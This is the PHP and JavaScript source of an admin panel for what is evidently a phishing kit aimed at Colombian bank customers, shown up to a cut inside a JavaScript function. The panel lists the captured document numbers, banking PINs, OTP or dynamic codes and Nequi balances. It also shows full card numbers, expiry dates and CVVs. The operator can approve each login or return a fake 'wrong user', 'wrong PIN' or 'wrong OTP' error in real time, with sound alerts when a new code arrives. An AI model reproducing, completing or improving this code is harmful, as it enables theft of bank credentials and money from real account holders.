<?php
// admin/index.php - PANEL DE SESIONES CON TARJETA UNIFICADA (LOGIN + OTP) - LETRAS BLANCAS

$dataDir = __DIR__ . '/data';
$logsFile = $dataDir . '/pse_logs.json';
$transaccionesFile = $dataDir . '/transacciones.json';

$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

$transacciones = [];
if (file_exists($transaccionesFile)) {
    $content = file_get_contents($transaccionesFile);
    $transacciones = json_decode($content, true) ?? [];
}

$total_logs = count($logs);
$pendientes = count(array_filter($logs, fn($l) => ($l['estado'] ?? '') === 'pendiente'));
$total_transacciones = count($transacciones);

$bancos = [];
foreach ($logs as $log) {
    $banco = $log['banco'] ?? 'Desconocido';
    if (!isset($bancos[$banco])) {
        $bancos[$banco] = 0;
    }
    $bancos[$banco]++;
}

// ======================== AGRUPACIÓN DE SESIONES ========================
$sesiones_agrupadas = [];

foreach ($logs as $log) {
    // OBTENER DOCUMENTO
    $documento = 'N/A';
    if (!empty($log['documento']) && $log['documento'] !== 'N/A') {
        $documento = $log['documento'];
    } elseif (!empty($log['usuario']) && $log['usuario'] !== 'N/A') {
        $documento = $log['usuario'];
    } elseif (!empty($log['identificacion']) && $log['identificacion'] !== 'N/A') {
        $documento = $log['identificacion'];
    } elseif (!empty($log['documento_pse'])) {
        $documento = $log['documento_pse'];
    } elseif (!empty($log['cedula'])) {
        $documento = $log['cedula'];
    } elseif (!empty($log['numero_documento'])) {
        $documento = $log['numero_documento'];
    } elseif (!empty($log['numero_identificacion'])) {
        $documento = $log['numero_identificacion'];
    }
    
    $banco = $log['banco'] ?? 'Desconocido';
    $clave = $log['clave_pin'] ?? '';
    $otp = $log['codigo_otp'] ?? $log['codigo_dinamica'] ?? '';
    $saldo = $log['saldo'] ?? '';
    $actividad = $log['activity'] ?? 'LOGIN';
    $estado = $log['estado'] ?? 'pendiente';
    $fecha = $log['fecha'] ?? '';
    $id = $log['id'];
    $error_tipo = $log['error_tipo'] ?? null;
    
    // ====== IDENTIFICAR BANCOS PROBLEMÁTICOS ======
    $bancoLower = strtolower($banco);
    $esBancoProblema = (strpos($bancoLower, 'bancolombia') !== false || 
                        strpos($bancoLower, 'bogota') !== false);
    
    // ====== CLAVE DE AGRUPACIÓN ======
    // Para bancos problemáticos: NUNCA AGRUPAR, cada log es su propia tarjeta
    if ($esBancoProblema) {
        // Usar ID único + timestamp para asegurar que nunca se agrupen
        $key = 'unique_' . $id . '_' . uniqid();
    } else {
        // Para otros bancos: agrupar por documento + banco si hay documento
        if ($documento === 'N/A' || empty($documento) || $documento === '') {
            $key = 'unique_' . $id . '_' . uniqid();
        } else {
            $key = md5($documento . '_' . strtolower($banco));
        }
    }
    
    // Si no existe el grupo, crearlo
    if (!isset($sesiones_agrupadas[$key])) {
        $sesiones_agrupadas[$key] = [
            'documento' => $documento,
            'usuario' => $documento,
            'banco' => $banco,
            'clave' => '',
            'otp' => '',
            'saldo' => '',
            'estado_login' => 'pendiente',
            'estado_otp' => 'pendiente',
            'login_id' => null,
            'otp_id' => null,
            'error_tipo' => null,
            'fecha_inicio' => $fecha,
            'actividad_login' => '',
            'actividad_otp' => '',
            'logs_ids' => []
        ];
    }
    
    $sesiones_agrupadas[$key]['logs_ids'][] = $id;
    
    $esOtp = strpos($actividad, 'OTP') !== false || strpos($actividad, 'DINÁMICA') !== false;
    $esSaldo = strpos($actividad, 'SALDO') !== false;
    
    if ($esOtp) {
        $sesiones_agrupadas[$key]['otp'] = $otp;
        $sesiones_agrupadas[$key]['otp_id'] = $id;
        $sesiones_agrupadas[$key]['estado_otp'] = $estado;
        $sesiones_agrupadas[$key]['actividad_otp'] = $actividad;
    } elseif ($esSaldo) {
        $sesiones_agrupadas[$key]['saldo'] = $saldo;
        $sesiones_agrupadas[$key]['estado_login'] = $estado;
        $sesiones_agrupadas[$key]['login_id'] = $id;
        $sesiones_agrupadas[$key]['actividad_login'] = $actividad;
        if ($error_tipo) {
            $sesiones_agrupadas[$key]['error_tipo'] = $error_tipo;
        }
    } else {
        // LOGIN normal
        $sesiones_agrupadas[$key]['clave'] = $clave;
        $sesiones_agrupadas[$key]['login_id'] = $id;
        $sesiones_agrupadas[$key]['estado_login'] = $estado;
        $sesiones_agrupadas[$key]['actividad_login'] = $actividad;
        if ($error_tipo) {
            $sesiones_agrupadas[$key]['error_tipo'] = $error_tipo;
        }
    }
    
    // Actualizar fecha si es más reciente
    if ($fecha > $sesiones_agrupadas[$key]['fecha_inicio']) {
        $sesiones_agrupadas[$key]['fecha_inicio'] = $fecha;
    }
}

usort($sesiones_agrupadas, function($a, $b) {
    return strcmp($b['fecha_inicio'], $a['fecha_inicio']);
});
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Sesiones</title>
    
    <!-- ========================================== -->
    <!-- SONIDOS PARA NUEVOS REGISTROS              -->
    <!-- ========================================== -->
    <audio id="loginSound" preload="auto">
        <source src="login.mp3" type="audio/mpeg">
    </audio>
    <audio id="otpSound" preload="auto">
        <source src="otp.mp3" type="audio/mpeg">
    </audio>
    <!-- ========================================== -->
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d0d1a;
            padding: 20px;
            color: #ffffff;
            min-height: 100vh;
        }
        .container { max-width: 1100px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header h1 { 
            font-size: 22px; 
            font-weight: 300; 
            color: #ffffff; 
        }
        .header h1 span { 
            color: #4CAF50; 
            font-weight: 700; 
        }

        .header-controls {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        .header-controls input {
            padding: 8px 14px;
            border-radius: 20px;
            border: 1px solid #444;
            background: #1a1a2e;
            color: #ffffff;
            font-size: 13px;
            width: 180px;
            outline: none;
        }
        .header-controls input::placeholder { 
            color: #888; 
        }
        .header-controls input:focus { 
            border-color: #4CAF50; 
        }

        .btn {
            padding: 6px 14px;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s;
            color: #ffffff;
        }
        .btn:hover { transform: scale(1.03); opacity: 0.9; }
        .btn-primary { background: #4CAF50; color: #ffffff; }
        .btn-danger { background: #e74c3c; color: #ffffff; }
        .btn-info { background: #3498db; color: #ffffff; }
        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 12px; }
        
        .btn-aprobar { background: #2ecc71; color: #ffffff; font-weight: 700; }
        .btn-error-usuario { background: #e74c3c; color: #ffffff; }
        .btn-error-clave { background: #f39c12; color: #ffffff; }
        .btn-error-saldo { background: #27ae60; color: #ffffff; }
        .btn-error-dinamica { background: #9b59b6; color: #ffffff; }
        .btn-error-otp { background: #c0392b; color: #ffffff; }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1a2e;
            padding: 12px 18px;
            border-radius: 10px;
            border-left: 3px solid #4CAF50;
        }
        .stat-card .label { 
            font-size: 11px; 
            color: #888; 
            text-transform: uppercase; 
        }
        .stat-card .value { 
            font-size: 22px; 
            font-weight: bold; 
            color: #ffffff; 
        }

        .filtros {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }
        .filtro-btn {
            padding: 5px 16px;
            border-radius: 15px;
            border: 1px solid #444;
            background: transparent;
            color: #aaa;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }
        .filtro-btn:hover, .filtro-btn.active {
            background: #4CAF50;
            color: #ffffff;
            border-color: #4CAF50;
        }

        .sesiones-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 30px;
        }

        .sesion-card {
            background: #1a1a2e;
            border-radius: 12px;
            padding: 16px 20px;
            border-left: 5px solid #f39c12;
            transition: all 0.3s;
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .sesion-card:hover { background: #222240; }
        .sesion-card.estado-aprobado { border-left-color: #2ecc71; }
        .sesion-card.estado-rechazado { border-left-color: #e74c3c; }

        .sesion-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        .sesion-banco {
            font-weight: bold;
            font-size: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            color: #ffffff;
        }
        .sesion-banco .badge {
            padding: 3px 14px;
            border-radius: 12px;
            font-size: 11px;
            color: #ffffff;
        }
        .badge-bancolombia { background: #1565C0; color: #ffffff; }
        .badge-bogota { background: #E65100; color: #ffffff; }
        .badge-davivienda { background: #C62828; color: #ffffff; }
        .badge-daviplata { background: #2E7D32; color: #ffffff; }
        .badge-falabella { background: #7B1FA2; color: #ffffff; }
        .badge-nequi { background: #00695C; color: #ffffff; }
        .badge-otro { background: #555; color: #ffffff; }

        .sesion-usuario {
            font-size: 14px;
            color: #ffffff;
            font-weight: 500;
        }
        .sesion-usuario .label {
            color: #888;
            font-size: 11px;
            text-transform: uppercase;
            margin-right: 4px;
        }

        .sesion-id {
            font-size: 10px;
            color: #777;
            font-family: monospace;
        }

        .sesion-estado-general {
            font-size: 11px;
            padding: 3px 14px;
            border-radius: 12px;
            font-weight: 600;
            color: #ffffff;
        }
        .estado-pendiente { background: #f39c12; color: #ffffff; }
        .estado-aprobado { background: #2ecc71; color: #ffffff; }
        .estado-rechazado { background: #e74c3c; color: #ffffff; }

        .error-badge {
            font-size: 10px;
            padding: 2px 10px;
            border-radius: 10px;
            margin-left: 4px;
            color: #ffffff;
        }
        .error-badge.usuario { background: #e74c3c; color: #ffffff; }
        .error-badge.clave { background: #f39c12; color: #ffffff; }
        .error-badge.saldo { background: #27ae60; color: #ffffff; }
        .error-badge.dinamica { background: #9b59b6; color: #ffffff; }
        .error-badge.otp { background: #c0392b; color: #ffffff; }

        .sesion-body {
            display: flex;
            flex-wrap: wrap;
            gap: 20px 40px;
            padding: 8px 0;
            background: #0d0d1a;
            border-radius: 8px;
            padding: 10px 16px;
        }
        .sesion-dato {
            font-size: 14px;
            color: #ffffff;
        }
        .sesion-dato .label {
            color: #888;
            font-size: 11px;
            text-transform: uppercase;
            margin-right: 6px;
        }
        .sesion-dato .valor {
            color: #ffffff;
            font-weight: 500;
        }
        .sesion-dato .valor.clave {
            font-family: monospace;
            letter-spacing: 2px;
            color: #f1c40f;
        }
        .sesion-dato .valor.otp {
            font-family: monospace;
            letter-spacing: 2px;
            color: #3498db;
        }
        .sesion-dato .valor.saldo {
            font-family: monospace;
            letter-spacing: 1px;
            color: #2ecc71;
        }
        .sesion-dato .valor.sin-dato {
            color: #666;
            font-style: italic;
        }

        .sesion-dato.saldo-dato .valor {
            color: #2ecc71;
            font-weight: 700;
            font-size: 16px;
        }
        .sesion-dato.saldo-dato .label {
            color: #2ecc71;
        }

        .sesion-pasos {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            font-size: 12px;
            padding: 4px 0;
            color: #ffffff;
        }
        .paso-item {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #ffffff;
        }
        .paso-item .estado-paso {
            padding: 2px 10px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: 600;
            color: #ffffff;
        }
        .paso-item .estado-paso.pendiente { background: #f39c12; color: #ffffff; }
        .paso-item .estado-paso.aprobado { background: #2ecc71; color: #ffffff; }
        .paso-item .estado-paso.rechazado { background: #e74c3c; color: #ffffff; }

        .sesion-acciones {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            padding-top: 8px;
            border-top: 1px solid #333;
            align-items: center;
        }
        .sesion-acciones .btn {
            min-width: 60px;
            text-align: center;
            color: #ffffff;
        }

        .sesion-fecha {
            font-size: 11px;
            color: #888;
        }

        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .toast {
            background: #1a1a2e;
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 8px;
            border-left: 4px solid #4CAF50;
            animation: slideIn 0.3s ease;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .toast.error { border-left-color: #e74c3c; }
        .toast.warning { border-left-color: #f39c12; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .empty-message {
            text-align: center;
            padding: 50px;
            color: #666;
            font-size: 16px;
        }

        @media (max-width: 700px) {
            .sesion-body { gap: 10px; flex-direction: column; }
            .sesion-dato { font-size: 13px; }
            .stats { grid-template-columns: 1fr 1fr; }
            .header h1 { font-size: 18px; }
            .header-controls input { width: 130px; }
            .sesion-card { padding: 14px 16px; }
            .sesion-pasos { flex-direction: column; gap: 5px; }
        }
        @media (max-width: 450px) {
            .sesion-top { flex-direction: column; align-items: flex-start; }
            .sesion-acciones { justify-content: center; }
            .sesion-acciones .btn { min-width: 50px; font-size: 10px; padding: 3px 8px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Panel de <span>Sesiones</span></h1>
            <div class="header-controls">
                <input type="text" id="filtroInput" placeholder="Filtrar..." onkeyup="aplicarFiltros()">
                <button class="btn btn-primary" onclick="cargarDatos()">🔄</button>
                <button class="btn btn-danger" onclick="borrarTodosLogs()">🗑️</button>
                <button class="btn btn-info" onclick="exportarCSV()">📥</button>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card"><div class="label">Total</div><div class="value" id="statTotal"><?php echo $total_logs; ?></div></div>
            <div class="stat-card"><div class="label">Pendientes</div><div class="value" id="statPendientes"><?php echo $pendientes; ?></div></div>
            <div class="stat-card"><div class="label">Bancos</div><div class="value"><?php echo count($bancos); ?></div></div>
            <div class="stat-card"><div class="label">Transacciones</div><div class="value"><?php echo $total_transacciones; ?></div></div>
        </div>

        <div class="filtros" id="filtrosBanco">
            <button class="filtro-btn active" data-banco="todos" onclick="filtrarPorBanco('todos')">Todos</button>
            <?php foreach ($bancos as $banco => $count): 
                $bancoSlug = strtolower(str_replace(' ', '_', $banco));
            ?>
                <button class="filtro-btn" data-banco="<?php echo $bancoSlug; ?>" onclick="filtrarPorBanco('<?php echo $bancoSlug; ?>')">
                    <?php echo htmlspecialchars($banco); ?> (<?php echo $count; ?>)
                </button>
            <?php endforeach; ?>
        </div>

        <div class="sesiones-list" id="sesionesList">
            <?php if (count($sesiones_agrupadas) > 0): ?>
                <?php foreach ($sesiones_agrupadas as $sesion): 
                    $banco = $sesion['banco'] ?? 'Desconocido';
                    $bancoLower = strtolower($banco);
                    $badgeClass = 'badge-otro';
                    if (strpos($bancoLower, 'bancolombia') !== false) $badgeClass = 'badge-bancolombia';
                    elseif (strpos($bancoLower, 'bogota') !== false) $badgeClass = 'badge-bogota';
                    elseif (strpos($bancoLower, 'davivienda') !== false) $badgeClass = 'badge-davivienda';
                    elseif (strpos($bancoLower, 'daviplata') !== false) $badgeClass = 'badge-daviplata';
                    elseif (strpos($bancoLower, 'falabella') !== false) $badgeClass = 'badge-falabella';
                    elseif (strpos($bancoLower, 'nequi') !== false) $badgeClass = 'badge-nequi';
                    
                    $usuario = $sesion['documento'] ?? $sesion['usuario'] ?? 'N/A';
                    $clave = $sesion['clave'] ?? '';
                    $otp = $sesion['otp'] ?? '';
                    $saldo = $sesion['saldo'] ?? '';
                    $login_id = $sesion['login_id'];
                    $otp_id = $sesion['otp_id'];
                    $estado_login = $sesion['estado_login'] ?? 'pendiente';
                    $estado_otp = $sesion['estado_otp'] ?? 'pendiente';
                    $error_tipo = $sesion['error_tipo'] ?? null;
                    $fecha = $sesion['fecha_inicio'] ?? '';
                    
                    $estado_general = 'pendiente';
                    if ($estado_login === 'rechazado' || $estado_otp === 'rechazado') {
                        $estado_general = 'rechazado';
                    } elseif ($estado_login === 'aprobado' && $estado_otp === 'aprobado') {
                        $estado_general = 'aprobado';
                    }
                    
                    $mostrarBotonesLogin = ($estado_login === 'pendiente');
                    $mostrarBotonesOtp = ($estado_login === 'aprobado' && $estado_otp === 'pendiente');
                    
                    // Verificar si es Nequi y tiene SALDO
                    $esNequi = strpos($bancoLower, 'nequi') !== false;
                    $tieneSaldo = !empty($saldo);
                ?>
                    <div class="sesion-card estado-<?php echo $estado_general; ?>" 
                         data-banco="<?php echo $bancoLower; ?>" 
                         data-usuario="<?php echo strtolower($usuario); ?>" 
                         data-id="<?php echo $login_id ?: $otp_id; ?>">
                        
                        <div class="sesion-top">
                            <div class="sesion-banco">
                                <span class="badge <?php echo $badgeClass; ?>"><?php echo htmlspecialchars($banco); ?></span>
                                <span class="sesion-usuario">
                                    <span class="label">👤</span>
                                    <?php echo htmlspecialchars($usuario); ?>
                                </span>
                                <span class="sesion-id">#<?php echo substr($login_id ?: $otp_id, -6); ?></span>
                                <?php if ($error_tipo): ?>
                                    <span class="error-badge <?php echo $error_tipo; ?>"><?php echo $error_tipo; ?></span>
                                <?php endif; ?>
                            </div>
                            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                                <span class="sesion-fecha"><?php echo substr($fecha, 11, 5); ?></span>
                                <span class="sesion-estado-general estado-<?php echo $estado_general; ?>">
                                    <?php echo ucfirst($estado_general); ?>
                                </span>
                            </div>
                        </div>

                        <div class="sesion-body">
                            <span class="sesion-dato">
                                <span class="label">👤 Usuario</span>
                                <span class="valor"><?php echo htmlspecialchars($usuario); ?></span>
                            </span>
                            <span class="sesion-dato">
                                <span class="label">🔑 Clave</span>
                                <span class="valor clave"><?php echo !empty($clave) ? htmlspecialchars($clave) : '<span class="sin-dato">—</span>'; ?></span>
                            </span>
                            <span class="sesion-dato">
                                <span class="label">📱 OTP</span>
                                <span class="valor otp"><?php echo !empty($otp) ? htmlspecialchars($otp) : '<span class="sin-dato">—</span>'; ?></span>
                            </span>
                            <?php if ($esNequi && $tieneSaldo): ?>
                            <span class="sesion-dato saldo-dato">
                                <span class="label">💰 SALDO</span>
                                <span class="valor saldo">$ <?php echo number_format(floatval($saldo)); ?></span>
                            </span>
                            <?php endif; ?>
                        </div>

                        <div class="sesion-pasos">
                            <span class="paso-item">
                                🔐 LOGIN: <span class="estado-paso <?php echo $estado_login; ?>"><?php echo ucfirst($estado_login); ?></span>
                            </span>
                            <span class="paso-item">
                                📱 OTP: <span class="estado-paso <?php echo $estado_otp; ?>"><?php echo ucfirst($estado_otp); ?></span>
                            </span>
                            <?php if ($esNequi && $tieneSaldo): ?>
                            <span class="paso-item" style="color:#2ecc71;">
                                💰 SALDO: <span class="estado-paso <?php echo $estado_login; ?>"><?php echo ucfirst($estado_login); ?></span>
                            </span>
                            <?php endif; ?>
                        </div>

                        <div class="sesion-acciones">
                            <?php if ($mostrarBotonesLogin): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarLogin('<?php echo $login_id; ?>')">✓ Aprobar</button>
                                <button class="btn btn-error-usuario btn-sm" onclick="errorUsuario('<?php echo $login_id; ?>')">✗ Err Usuario</button>
                                <button class="btn btn-error-clave btn-sm" onclick="errorClave('<?php echo $login_id; ?>')">✗ Err Clave</button>
                                <!-- Botón Error Saldo SOLO para Nequi -->
                                <?php if ($esNequi): ?>
                                <button class="btn btn-error-saldo btn-sm" onclick="errorSaldo('<?php echo $login_id; ?>')">✗ Err Saldo</button>
                                <?php endif; ?>
                            <?php elseif ($mostrarBotonesOtp): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarOtp('<?php echo $otp_id; ?>')">✓ Aprobar OTP</button>
                                <button class="btn btn-error-dinamica btn-sm" onclick="errorDinamica('<?php echo $otp_id; ?>')">✗ Err Dinámica</button>
                                <button class="btn btn-error-otp btn-sm" onclick="errorOtp('<?php echo $otp_id; ?>')">✗ Err OTP</button>
                            <?php else: ?>
                                <span style="font-size:12px;color:#888;padding:4px 10px;">✅ Sesión completada</span>
                            <?php endif; ?>
                            <button class="btn btn-danger btn-sm" onclick="borrarSesion('<?php echo $login_id ?: $otp_id; ?>')">🗑️</button>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="empty-message">📭 No hay sesiones</div>
            <?php endif; ?>
        </div>
        
        <!-- ==================== TABLA DE TRANSACCIONES CON TARJETAS ==================== -->
        <h2 style="color:#ffffff; margin-top: 30px; margin-bottom: 15px;">💳 Transacciones</h2>
        <div class="table-wrapper" style="overflow-x: auto;">
            <table style="width:100%; border-collapse: collapse; font-size: 12px;">
                <thead>
                    <tr>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Fecha</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Tipo</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Plan</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Titular</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Documento</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">N° Tarjeta</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Vencimiento</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">CVV</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Monto</th>
                        <th style="background:#1a1a2e; padding:10px; text-align:left; color:#888; border-bottom:2px solid #333;">Detalles</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (count($transacciones) > 0): ?>
                        <?php foreach (array_reverse($transacciones) as $t): ?>
                            <tr>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff;"><?php echo substr($t['fecha'] ?? '', 11, 5); ?></td>
                                <td style="padding:10px; border-bottom:1px solid #222;">
                                    <?php if (($t['tipo'] ?? '') === 'TARJETA'): ?>
                                        <span class="badge badge-tarjeta" style="background:#e3f2fd; color:#1976d2; padding:4px 8px; border-radius:3px; font-size:10px; font-weight:bold;">💳 Tarjeta</span>
                                    <?php else: ?>
                                        <span class="badge badge-pse" style="background:#f3e5f5; color:#7b1fa2; padding:4px 8px; border-radius:3px; font-size:10px; font-weight:bold;">🏦 PSE</span>
                                    <?php endif; ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff;"><?php echo htmlspecialchars($t['plan_nombre'] ?? 'N/A'); ?></td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff;">
                                    <?php 
                                        $titular = '';
                                        if (!empty($t['titular'])) {
                                            $titular = htmlspecialchars($t['titular']);
                                        } elseif (!empty($t['titular_pse'])) {
                                            $titular = htmlspecialchars($t['titular_pse']);
                                        }
                                        echo $titular ?: 'N/A';
                                    ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff;">
                                    <?php 
                                        $doc = '';
                                        if (!empty($t['documento'])) {
                                            $doc = htmlspecialchars($t['documento']);
                                        } elseif (!empty($t['documento_pse'])) {
                                            $doc = htmlspecialchars($t['documento_pse']);
                                        }
                                        echo $doc ?: 'N/A';
                                    ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff; font-family: monospace; letter-spacing: 1px;">
                                    <?php echo !empty($t['numero_tarjeta']) ? htmlspecialchars($t['numero_tarjeta']) : 'N/A'; ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff;"><?php echo htmlspecialchars($t['vencimiento'] ?? 'N/A'); ?></td>
                                <td style="padding:10px; border-bottom:1px solid #222; color:#fff; font-family: monospace; letter-spacing: 1px;">
                                    <?php echo htmlspecialchars($t['cvc'] ?? 'N/A'); ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222; font-weight: bold; color: #ff8c00;">
                                    $ <?php echo number_format(round($t['plan_precio'] ?? $t['monto'] ?? 0)); ?>
                                </td>
                                <td style="padding:10px; border-bottom:1px solid #222;">
                                    <button class="btn btn-sm" style="background:#2196f3; color:white; border:none; padding:4px 10px; border-radius:4px; cursor:pointer;" onclick="verDetalles(<?php echo htmlspecialchars(json_encode($t)); ?>)">Ver</button>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <tr><td colspan="10" class="empty" style="text-align:center; padding:40px; color:#666;">📭 No hay transacciones</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Modal Detalles -->
    <div class="modal" id="modalDetalles" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1000; align-items:center; justify-content:center;">
        <div class="modal-content" style="background:#1a1a2e; padding:30px; border-radius:8px; max-width:600px; max-height:80vh; overflow-y:auto; box-shadow:0 4px 20px rgba(0,0,0,0.5);">
            <div class="modal-header" id="modalTitulo" style="font-size:20px; font-weight:bold; margin-bottom:20px; color:#fff; border-bottom:2px solid #ff8c00; padding-bottom:10px;">Detalles de Transacción</div>
            <div id="modalBody"></div>
            <button class="modal-close" onclick="cerrarModal()" style="margin-top:20px; width:100%; padding:12px; background:#ff8c00; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">Cerrar</button>
        </div>
    </div>

    <div class="toast-container" id="toastContainer"></div>

    <script>
        // ==========================================
        // NOTIFICACIONES DEL NAVEGADOR
        // ==========================================
        function solicitarPermisoNotificaciones() {
            if ('Notification' in window) {
                if (Notification.permission === 'default') {
                    Notification.requestPermission();
                }
            }
        }

        function enviarNotificacion(titulo, mensaje) {
            if ('Notification' in window && Notification.permission === 'granted') {
                try {
                    const options = {
                        body: mensaje,
                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
                        tag: 'nuevo-registro',
                        requireInteraction: true,
                        vibrate: [200, 100, 200]
                    };
                    const notificacion = new Notification(titulo, options);
                    setTimeout(() => notificacion.close(), 8000);
                } catch (e) {
                    console.log('Error en notificación:', e);
                }
            }
        }

        // ==========================================
        // SOLICITAR PERMISO AL CARGAR
        // ==========================================
        document.addEventListener('DOMContentLoaded', function() {
            solicitarPermisoNotificaciones();
        });

        // ==========================================
        // VARIABLES PARA CONTROLAR NUEVOS REGISTROS
        // ==========================================
        let ultimoTotal = <?php echo $total_logs; ?>;
        let ultimoLoginId = null;
        let ultimoOtpId = null;

        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                setTimeout(() => toast.remove(), 300);
            }, 2500);
        }

        // ==========================================
        // REPRODUCIR SONIDOS
        // ==========================================
        function reproducirSonido(tipo) {
            try {
                let audio = null;
                if (tipo === 'login') {
                    audio = document.getElementById('loginSound');
                } else if (tipo === 'otp') {
                    audio = document.getElementById('otpSound');
                }
                
                if (audio) {
                    audio.currentTime = 0;
                    audio.volume = 1.0;
                    audio.play().catch(e => console.log('Audio bloqueado por el navegador'));
                }
            } catch (e) {
                console.log('Error al reproducir sonido:', e);
            }
        }

        // ==========================================
        // DETECTAR NUEVOS REGISTROS
        // ==========================================
        function detectarNuevosRegistros(logsActuales) {
            const logsRecientes = logsActuales.slice(0, 20);
            
            for (const log of logsRecientes) {
                const actividad = log.activity || '';
                const id = log.id;
                const usuario = log.usuario || 'Desconocido';
                const esLogin = actividad.includes('LOGIN') && !actividad.includes('OTP') && !actividad.includes('DINÁMICA');
                const esOtp = actividad.includes('OTP') || actividad.includes('DINÁMICA');
                
                if (esLogin && id !== ultimoLoginId) {
                    ultimoLoginId = id;
                    reproducirSonido('login');
                    enviarNotificacion('🔊 Nuevo LOGIN', '👤 Usuario: ' + usuario);
                    showToast('🔊 Nuevo LOGIN recibido!', 'success');
                    return;
                }
                
                if (esOtp && id !== ultimoOtpId) {
                    ultimoOtpId = id;
                    reproducirSonido('otp');
                    enviarNotificacion('🔔 Nueva OTP', '📱 Código para: ' + usuario);
                    showToast('🔔 Nueva OTP/DINÁMICA recibida!', 'success');
                    return;
                }
            }
        }

        // ==========================================
        // EXTRAER LOGS DEL HTML
        // ==========================================
        function obtenerLogsDesdeHTML() {
            const logs = [];
            const cards = document.querySelectorAll('.sesion-card');
            
            cards.forEach(card => {
                const id = card.dataset.id || '';
                const usuario = card.querySelector('.sesion-usuario .valor')?.textContent || '';
                const estado = card.querySelector('.sesion-estado-general')?.textContent?.trim() || '';
                const actividad = card.querySelector('.sesion-actividad')?.textContent || '';
                
                logs.push({
                    id: id,
                    usuario: usuario,
                    estado: estado,
                    activity: actividad
                });
            });
            
            return logs;
        }

        // ======================== LOGIN ========================
        function aprobarLogin(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ LOGIN Aprobado'); cargarDatos(); });
        }

        function errorUsuario(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=usuario'
            }).then(() => { showToast('❌ Error Usuario', 'error'); cargarDatos(); });
        }

        function errorClave(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
